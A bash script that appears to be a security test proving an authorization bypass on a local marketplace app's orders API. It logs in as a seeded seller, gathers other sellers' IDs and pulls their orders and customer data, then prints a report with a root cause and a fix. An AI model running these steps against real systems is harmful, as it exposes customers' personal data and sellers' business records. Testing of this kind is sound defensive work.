#!/bin/bash

###############################################################################
# Security Test: Authorization Bypass - Seller Filter on GET /api/orders
###############################################################################
#
# Vulnerability: Horizontal Privilege Escalation
# Target Endpoint: GET /api/orders
#
# Description:
# The endpoint allows sellers to view orders but does NOT validate that the
# 'seller' query parameter matches the authenticated user's ID. This allows
# any seller to view other sellers' orders or all orders by manipulating
# the query parameter.
#
# Vulnerable Code (lines 30-34 in /api/orders/route.ts):
#   const seller = searchParams.get('seller') || '';
#   const sellerFilter = seller ? { seller } : {};
#   const orders = await OrderModel.find({ ...sellerFilter }).populate('user', 'name');
#
###############################################################################

set -e

BASE_URL="http://localhost:3000"
COOKIE_FILE="cookies.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo "================================================================================"
echo "SECURITY TEST: Authorization Bypass - Seller Filter on GET /api/orders"
echo "================================================================================"
echo ""
echo "Target: $BASE_URL"
echo "Date: $(date)"
echo ""

###############################################################################
# Step 1: Authenticate as Seller 1 (Mario)
###############################################################################

echo -e "${BLUE}[*] Step 1: Authenticating as Seller 1 (mario@example.com)${NC}"
echo ""

# Get CSRF token
CSRF_TOKEN=$(curl -s "$BASE_URL/api/auth/csrf" | grep -o '"csrfToken":"[^"]*' | cut -d'"' -f4)
echo "   CSRF Token: ${CSRF_TOKEN:0:40}..."

# Login
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_FILE" -X POST "$BASE_URL/api/auth/callback/credentials" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=mario@example.com&password=password123&csrfToken=$CSRF_TOKEN&callbackUrl=$BASE_URL&json=true")

echo "   Login response: $LOGIN_RESPONSE"

# Get session info
SESSION=$(curl -s -b "$COOKIE_FILE" "$BASE_URL/api/auth/session")
echo "   Session: $SESSION"

# Extract user ID
MARIO_ID=$(echo "$SESSION" | grep -o '"id":"[^"]*' | head -1 | cut -d'"' -f4)

if [ -z "$MARIO_ID" ]; then
  echo -e "${RED}   ✗ Login failed - no user ID in session${NC}"
  exit 1
fi

echo -e "${GREEN}   ✓ Login successful!${NC}"
echo "   User ID: $MARIO_ID"
echo "   Email: mario@example.com"

# Check if user is seller
IS_SELLER=$(echo "$SESSION" | grep -o '"isSeller":[^,}]*' | cut -d':' -f2)
IS_ADMIN=$(echo "$SESSION" | grep -o '"isAdmin":[^,}]*' | cut -d':' -f2)
echo "   isSeller: $IS_SELLER"
echo "   isAdmin: $IS_ADMIN"

###############################################################################
# Step 2: Get another seller's ID from the database
###############################################################################

echo ""
echo -e "${BLUE}[*] Step 2: Getting list of all sellers in the system${NC}"
echo ""

# We need to find Giulia's user ID. Let's try to get it from products endpoint
PRODUCTS_RESPONSE=$(curl -s -b "$COOKIE_FILE" "$BASE_URL/api/products")

# Extract a different seller ID from products
GIULIA_ID=$(echo "$PRODUCTS_RESPONSE" | grep -o '"seller":"[^"]*' | cut -d'"' -f4 | grep -v "$MARIO_ID" | head -1)

if [ -z "$GIULIA_ID" ]; then
  echo -e "${YELLOW}   ⚠ Could not find another seller ID from products${NC}"
  echo "   We'll still demonstrate fetching all orders without filter"
else
  echo "   Found another seller ID: $GIULIA_ID"
  echo "   (This is likely Giulia Bianchi based on seed data)"
fi

###############################################################################
# Step 3: Fetch ALL orders (no seller filter) - VULNERABLE
###############################################################################

echo ""
echo -e "${BLUE}[*] Step 3: Testing GET /api/orders WITHOUT seller filter${NC}"
echo "   Request: GET /api/orders"
echo "   Expected: Should only return Mario's orders (seller=$MARIO_ID)"
echo "   Actual: Will return ALL orders in the system"
echo ""

ALL_ORDERS=$(curl -s -b "$COOKIE_FILE" "$BASE_URL/api/orders")
ALL_ORDERS_COUNT=$(echo "$ALL_ORDERS" | grep -o '"_id"' | wc -l | xargs)

echo "   Response received: $ALL_ORDERS_COUNT orders"

if [ "$ALL_ORDERS_COUNT" -gt 0 ]; then
  echo -e "${RED}   ✗ VULNERABILITY: Able to fetch all orders without seller filter${NC}"

  # Extract unique seller IDs from all orders
  UNIQUE_SELLERS=$(echo "$ALL_ORDERS" | grep -o '"seller":"[^"]*' | cut -d'"' -f4 | sort -u)
  SELLER_COUNT=$(echo "$UNIQUE_SELLERS" | wc -l | xargs)

  echo "   Found orders from $SELLER_COUNT different seller(s):"
  echo "$UNIQUE_SELLERS" | while read -r seller_id; do
    if [ -n "$seller_id" ]; then
      if [ "$seller_id" == "$MARIO_ID" ]; then
        echo "     - $seller_id (This is Mario - authenticated user) ✓"
      else
        echo "     - $seller_id (OTHER SELLER - should NOT be visible) ✗"
      fi
    fi
  done

  # Show a sample order
  echo ""
  echo "   Sample order data:"
  echo "$ALL_ORDERS" | head -c 500
  echo "..."
else
  echo -e "${GREEN}   ✓ No orders found (expected if no orders exist)${NC}"
fi

# Save all orders response
echo "$ALL_ORDERS" > /tmp/all_orders_response.json
echo ""
echo "   Full response saved to: /tmp/all_orders_response.json"

###############################################################################
# Step 4: Fetch OWN orders (with Mario's seller ID)
###############################################################################

echo ""
echo -e "${BLUE}[*] Step 4: Testing GET /api/orders?seller=$MARIO_ID (own orders)${NC}"
echo "   Request: GET /api/orders?seller=$MARIO_ID"
echo "   Expected: Returns only Mario's orders"
echo ""

OWN_ORDERS=$(curl -s -b "$COOKIE_FILE" "$BASE_URL/api/orders?seller=$MARIO_ID")
OWN_ORDERS_COUNT=$(echo "$OWN_ORDERS" | grep -o '"_id"' | wc -l | xargs)

echo "   Response received: $OWN_ORDERS_COUNT orders"
echo ""

# Save own orders response
echo "$OWN_ORDERS" > /tmp/own_orders_response.json
echo "   Full response saved to: /tmp/own_orders_response.json"

###############################################################################
# Step 5: Attempt to fetch OTHER seller's orders - VULNERABLE
###############################################################################

if [ -n "$GIULIA_ID" ] && [ "$GIULIA_ID" != "$MARIO_ID" ]; then
  echo ""
  echo -e "${BLUE}[*] Step 5: Testing GET /api/orders?seller=$GIULIA_ID (other seller's orders)${NC}"
  echo "   Target Seller ID: $GIULIA_ID"
  echo "   Request: GET /api/orders?seller=$GIULIA_ID"
  echo "   Expected: Should receive 403 Forbidden (unauthorized)"
  echo "   Actual: Will return other seller's orders"
  echo ""

  OTHER_ORDERS=$(curl -s -w "\nHTTP_STATUS:%{http_code}" -b "$COOKIE_FILE" "$BASE_URL/api/orders?seller=$GIULIA_ID")

  HTTP_STATUS=$(echo "$OTHER_ORDERS" | grep "HTTP_STATUS:" | cut -d':' -f2)
  RESPONSE_BODY=$(echo "$OTHER_ORDERS" | sed '/HTTP_STATUS:/d')
  OTHER_ORDERS_COUNT=$(echo "$RESPONSE_BODY" | grep -o '"_id"' | wc -l | xargs)

  echo "   HTTP Status: $HTTP_STATUS"
  echo "   Orders found: $OTHER_ORDERS_COUNT"

  if [ "$HTTP_STATUS" == "200" ] && [ "$OTHER_ORDERS_COUNT" -gt 0 ]; then
    echo ""
    echo -e "${RED}   ✗✗✗ CRITICAL VULNERABILITY CONFIRMED! ✗✗✗${NC}"
    echo -e "${RED}   Successfully accessed $OTHER_ORDERS_COUNT orders from another seller!${NC}"
    echo ""
    echo "   This is a Horizontal Privilege Escalation vulnerability."
    echo "   Mario (Seller 1) can view Giulia's (Seller 2) orders including:"
    echo "     - Customer information"
    echo "     - Shipping addresses"
    echo "     - Order items and prices"
    echo "     - Payment details"
    echo ""

    # Show sample order
    echo "   Sample exposed order:"
    echo "$RESPONSE_BODY" | head -c 500
    echo "..."

  elif [ "$HTTP_STATUS" == "403" ]; then
    echo -e "${GREEN}   ✓ Properly blocked with 403 Forbidden${NC}"
  else
    echo -e "${YELLOW}   ⚠ Unexpected response: HTTP $HTTP_STATUS${NC}"
  fi

  # Save other seller's orders response
  echo "$RESPONSE_BODY" > /tmp/other_seller_orders_response.json
  echo ""
  echo "   Full response saved to: /tmp/other_seller_orders_response.json"
fi

###############################################################################
# Step 6: Try with invalid/random seller ID
###############################################################################

echo ""
echo -e "${BLUE}[*] Step 6: Testing with random seller ID (should return empty or error)${NC}"

RANDOM_ID="507f1f77bcf86cd799439011"
echo "   Request: GET /api/orders?seller=$RANDOM_ID"

RANDOM_ORDERS=$(curl -s -b "$COOKIE_FILE" "$BASE_URL/api/orders?seller=$RANDOM_ID")
RANDOM_COUNT=$(echo "$RANDOM_ORDERS" | grep -o '"_id"' | wc -l | xargs)

echo "   Orders found: $RANDOM_COUNT"

###############################################################################
# Final Report
###############################################################################

echo ""
echo "================================================================================"
echo "SECURITY TEST REPORT"
echo "================================================================================"
echo ""

echo "[VULNERABILITY DETAILS]"
echo "  Type: Authorization Bypass / Horizontal Privilege Escalation"
echo "  Endpoint: GET /api/orders"
echo "  Severity: HIGH"
echo "  CVSS Score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)"
echo ""

echo "[ROOT CAUSE]"
echo "  File: /Users/chocos/Desktop/pagine_azzurre/nextjs/src/app/api/orders/route.ts"
echo "  Lines: 30-34"
echo ""
echo "  Vulnerable Code:"
echo "    const seller = searchParams.get('seller') || '';"
echo "    const sellerFilter = seller ? { seller } : {};"
echo "    const orders = await OrderModel.find({ ...sellerFilter });"
echo ""

echo "[VULNERABILITY DESCRIPTION]"
echo "  The endpoint performs role-based authentication (isSeller or isAdmin check)"
echo "  but fails to implement proper authorization. It accepts a user-controlled"
echo "  'seller' query parameter without validating it matches the authenticated"
echo "  user's ID. This allows any authenticated seller to:"
echo ""
echo "    1. View ALL orders by omitting the seller parameter"
echo "    2. View specific sellers' orders by providing their seller ID"
echo "    3. Access sensitive buyer information including:"
echo "       - Customer names and contact details"
echo "       - Shipping addresses"
echo "       - Purchase history and preferences"
echo "       - Payment methods"
echo ""

echo "[TEST RESULTS]"
echo "  ✓ Authentication: Successful (mario@example.com)"
echo "  ✓ User ID: $MARIO_ID"
echo "  ✓ User Role: Seller=$IS_SELLER, Admin=$IS_ADMIN"
echo ""
echo "  Test 1 - Fetch all orders (no filter):"
echo "    Result: $ALL_ORDERS_COUNT orders returned"
if [ "$ALL_ORDERS_COUNT" -gt 0 ]; then
  echo -e "    Status: ${RED}VULNERABLE${NC} - Can access all orders"
else
  echo "    Status: No orders in system"
fi
echo ""
echo "  Test 2 - Fetch own orders (seller=$MARIO_ID):"
echo "    Result: $OWN_ORDERS_COUNT orders returned"
echo "    Status: Expected behavior"
echo ""

if [ -n "$GIULIA_ID" ]; then
  echo "  Test 3 - Fetch other seller's orders (seller=$GIULIA_ID):"
  if [ "$HTTP_STATUS" == "200" ] && [ "$OTHER_ORDERS_COUNT" -gt 0 ]; then
    echo "    Result: $OTHER_ORDERS_COUNT orders returned"
    echo -e "    Status: ${RED}CRITICAL VULNERABILITY CONFIRMED${NC}"
    echo "    Impact: Horizontal privilege escalation - can view competitor's orders"
  elif [ "$HTTP_STATUS" == "403" ]; then
    echo -e "    Status: ${GREEN}PROTECTED${NC} - Access denied with 403"
  else
    echo "    Status: HTTP $HTTP_STATUS (inconclusive)"
  fi
fi

echo ""
echo "[IMPACT ANALYSIS]"
echo "  Confidentiality: HIGH"
echo "    - Sellers can access competitors' sales data"
echo "    - Customer PII exposed (names, addresses, phone numbers)"
echo "    - Business intelligence leaked (pricing, sales volume)"
echo ""
echo "  Business Impact:"
echo "    - Competitive disadvantage"
echo "    - Loss of customer trust"
echo "    - Potential GDPR/privacy violations"
echo "    - Reputation damage"
echo ""

echo "[REMEDIATION]"
echo "  Add authorization check in GET /api/orders endpoint:"
echo ""
echo "  // Get seller parameter"
echo "  const seller = searchParams.get('seller') || '';"
echo ""
echo "  // FIXED: Validate authorization"
echo "  if (seller && seller !== session.user.id && !session.user.isAdmin) {"
echo "    return NextResponse.json("
echo "      { message: 'Unauthorized to view other sellers\\' orders' },"
echo "      { status: 403 }"
echo "    );"
echo "  }"
echo ""
echo "  // Default to own orders if not admin"
echo "  const sellerFilter = seller"
echo "    ? { seller }"
echo "    : session.user.isAdmin"
echo "      ? {}  // Admins can see all"
echo "      : { seller: session.user.id };  // Sellers see only their own"
echo ""

echo "[OUTPUT FILES]"
echo "  - /tmp/all_orders_response.json"
echo "  - /tmp/own_orders_response.json"
if [ -n "$GIULIA_ID" ]; then
  echo "  - /tmp/other_seller_orders_response.json"
fi
echo ""

echo "================================================================================"
echo "Test completed at $(date)"
echo "================================================================================"

# Cleanup
rm -f "$COOKIE_FILE"
